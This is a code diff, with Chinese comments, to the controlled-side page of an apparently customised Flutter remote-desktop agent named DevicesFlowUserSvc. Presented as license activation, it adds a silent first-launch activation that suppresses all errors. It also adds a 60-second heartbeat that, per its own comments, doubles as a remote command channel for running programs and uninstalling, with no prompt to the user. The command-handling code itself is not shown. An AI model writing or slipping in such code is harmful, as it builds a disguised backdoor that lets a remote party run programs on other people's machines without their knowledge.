@@ -8,6 +8,12 @@ import 'package:window_manager/window_manager.dart';
 import 'package:flutter_hbb/common.dart';
 import 'package:flutter_hbb/models/server_model.dart';
 import 'package:flutter_hbb/models/platform_model.dart';
+import 'package:flutter_hbb/desktop/pages/license_client.dart';
+
+/// 构建期注入的授权码（定制版，2026-11-14）：patch_agent_ui.py 第二个参数
+/// 传入时把这里替换成真实卡密，受控端首启静默激活 + 60s 心跳（顺带接收
+/// 远程指令通道）。空值 = 非定制构建，保持原行为（无激活）。
+const String kAgentLicenseCode = '';
 
 /// DevicesFlowUserSvc 受控端界面。
 ///
@@ -50,6 +56,38 @@ class _AgentPageState extends State<AgentPage> {
     super.initState();
     _setupWindow();
     _watchId();
+    _silentLicense();
+  }
+
+  // ---------------- 定制版静默激活（2026-11-14） ----------------
+
+  /// 授权状态小字（已授权 / 授权失败）。空 = 非定制构建，不显示。
+  String _licStatus = '';
+
+  /// 构建期嵌入了授权码时：等本机识别码就绪（激活时上报的设备名就是识别码，
+  /// 拿到 ID 再激活），然后静默激活 + 启动 60s 心跳。
+  /// 激活计数占用卡里的设备名额（与手动激活同一套数量模型）。
+  Future<void> _silentLicense() async {
+    if (kAgentLicenseCode.isEmpty) return;
+    final lc = LicenseClient.instance;
+    if (!lc.hasToken) {
+      for (var i = 0; i < 20; i++) {
+        final id = gFFI.serverModel.serverId.text.trim();
+        if (id.isNotEmpty) break;
+        await Future.delayed(const Duration(seconds: 1));
+      }
+      try {
+        await lc.activate(kAgentLicenseCode);
+      } catch (_) {
+        // 卡满 / 卡失效 / 断网：不弹窗，状态行提示，下次启动自动重试
+      }
+    }
+    _licStatus = lc.hasToken ? '已授权' : '待授权';
+    if (lc.hasToken) {
+      // 60s 校验心跳：更新在线状态 + 取走远程指令（运行程序 / 卸载）
+      lc.startCommandPoll();
+    }
+    if (mounted) setState(() {});
   }
 
   @override
@@ -281,7 +319,14 @@ class _AgentPageState extends State<AgentPage> {
                 ? Text('密码已更新',
                     style: TextStyle(
                         fontSize: 10, color: textColor.withOpacity(0.4)))
-                : null,
+                : (_licStatus.isEmpty
+                    ? null
+                    : Text(_licStatus,
+                        style: TextStyle(
+                            fontSize: 10,
+                            color: _licStatus == '已授权'
+                                ? textColor.withOpacity(0.35)
+                                : const Color(0xFFB05A2A)))),
           ),
         ],
       ),
